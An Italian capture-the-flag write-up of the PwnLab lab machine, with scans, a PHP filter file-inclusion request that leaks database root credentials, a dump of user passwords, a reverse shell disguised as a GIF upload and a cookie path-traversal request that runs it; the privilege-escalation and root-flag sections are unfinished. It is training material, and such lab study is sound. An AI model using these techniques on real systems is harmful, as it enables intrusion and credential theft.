PWN_LAB INIT

# NETDISCOVER 👨‍💻
Prima di tutto eseguiamo un netdiscover per scoprire l'indirizzo ip della macchina 
```
netdiscover 10.211.55.0/24
Currently scanning: Finished! | Screen View: Unique Hosts
3 Captured ARP Req/Rep packets, from 2 hosts. Total size: 126
_____________________________________________________________________________ 
IP At MAC Address Count Len MAC Vendor / Hostname
----------------------------------------------------------------------------- 
10.211.55.1 00:1c:42:00:00:18 1 42 Parallels, Inc. 
10.211.55.17 00:1c:42:4d:69:40 2 84 Parallels, Inc.
```

Il primo indirizzo é il nostro (macchina kali), la macchina da attaccare é il secondo ip della lista.

# NMAP 🔍
```
nmap -sV -sC 10.211.55.17
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-16 15:02 CEST Nmap scan report for pwnlab-vulnhub.shared (10.211.55.17)
Host is up (0.00012s latency).
Not shown: 997 closed ports
PORT STATE SERVICE VERSION
80/tcp open http Apache httpd 2.4.10 ((Debian)) |_http-server-header: Apache/2.4.10 (Debian)
|_http-title: PwnLab Intranet Image Hosting
111/tcp open rpcbind 2-4 (RPC #100000)
| rpcinfo:
| program version port/proto service
...
3306/tcp open mysql MySQL 5.5.47-0+deb8u1
| mysql-info:
| Protocol: 10
| Version: 5.5.47-0+deb8u1
| Thread ID: 39
| Capabilities flags: 63487
| Some Capabilities: SupportsLoadDataLocal, Support41Auth, IgnoreSigpipes, SupportsTransactions, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, DontAllowDatabaseTableColumn, ConnectWithDatabase, InteractiveClient, FoundRows, Speaks41ProtocolNew, ODBCClient, SupportsCompression, LongPassword, LongColumnFlag, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
| Status: Autocommit
| Salt: =sK^vV+r|=Vxyvdt;gv<
|_ Auth Plugin Name: mysql_native_password
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 6.71 seconds
```
Visto che abbiamo trovato la porta 80 aperta, apriamo un browser e vediamo cosa troviamo.  
Troviamo una pagina di login e una di "upload" dove poter caricare dei dati, ma solo se loggati.

# LOGIN PAGE 🛠

<!-- qui manca il perché di questa cosa! -->
```
curl -s http://10.211.55.17/?page=php://filter/convert.base64-encode/resource=config
```
Analizziamo il comando: stiamo eseguendo una filter del codice php e lo stiamo codificando in modo tale che il broswer non interpreti il php, cosí da farci restituire il codice php come stringa codificata. In seguito decodifichiamo quello che é stato codificato in base64.
```
<html>
<head>
<title>PwnLab Intranet Image Hosting</title>
</head>
<body>
<center>
<img src="images/pwnlab.png"><br />
[ <a href="/">Home</a> ] [ <a href="?page=login">Login</a> ] [ <a href="?page=upload">Upload</a> ] <hr/><br/> PD9waHANCiRzZXJ2ZXIJICA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIkg0dSVRS center>
</body>
</html>
```
Decodifichiamo
```
echo "PD9waHANCiRzZXJ2ZXIJICA9I...lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIkg0dSVR" | base64 -d
```
Otteniamo il codice php in chiaro.
```
<?php
$server = "localhost"; 
$username = "root"; 
$password = "H4u%QJ_H99"; 
$database = "Users";
?>
```
Proviamo ad entrare su mysql con queste credenziali
```
mysql -h 10.211.55.17 -u root -p
Enter password:
Welcome to the MariaDB monitor. Commands end with ; or \g. Your MySQL connection id is 114764
Server version: 5.5.47-0+deb8u1 (Debian)
...
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| Users              |
+--------------------+
2 rows in set (0.002 sec)
...
MySQL [(none)]> use Users;
...
MySQL [Users]> show tables;
+-----------------+
| Tables_in_Users |
+-----------------+
| users           |
+-----------------+
MySQL [Users]> Select * from users; 
+------+------------------+
| user | pass             | 
+------+------------------+
| kent | Sld6WHVCSkpOeQ== |
| mike | U0lmZHNURW42SQ== | 
| kane | aVN2NVltMkdSbw== | 
+------+------------------+
```
Anche le password sono codificate in base64.  
Proviamo a loggarci con  
* user: kent  
* password: Sld6WHVCSkpOeQ== (decodificata ->) JWzXuBJJNy  

Perfetto, ci siamo loggati ma notiamo che possiamo caricare solo immagini, quindi dobbiamo trovare il modo di caricare la nostra reverse shell come una immagine.
# REVERSE SHELL 🔁
Per caricare la reverse shell, prendiamo il file in php (/usr/share/webshells/php-reverse-shell.php), modifichiamolo con i nostri parametri e aggiungiamo in testa l'header dei file GIF: ```GIF89``` e cambiamo l'estensione in ```.gif```  
Carichiamo la nostra reverse shell modificata e facciamo partire netcat sulla nostra macchina.  
Sfruttando il browser nella cartella /uploads troviamo il nostro file.  
Per far esegure la shell caricata sul web server sfruttiamo burpsuite (ma anche curl va bene) eseguendo la seguente GET. (occhio al nome del file che abbiamo caricato nel cookie!)
<!-- anche qui manca il perché di questa cosa!-->
```
GET / HTTP/1.1
Host: 10.211.55.17
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.92 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/ signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: lang=../upload/3eaa8ef68810b5720fdb48484d9b24ff.gif
If-None-Match: W/"17c7-5a5e2980343c0"
If-Modified-Since: Mon, 18 May 2020 02:05:15 GMT
Connection: close
```
# PRIVILEDGE ESCALATION 💵

<!-- si doveva modificare il comportamento di cat e poi chiamare un eseguibile che potevamo chiamare senza sudo: echo “/bin/sh/” > cat PATH=.:$PATH -->

# ROOT FLAG 🏴‍☠️
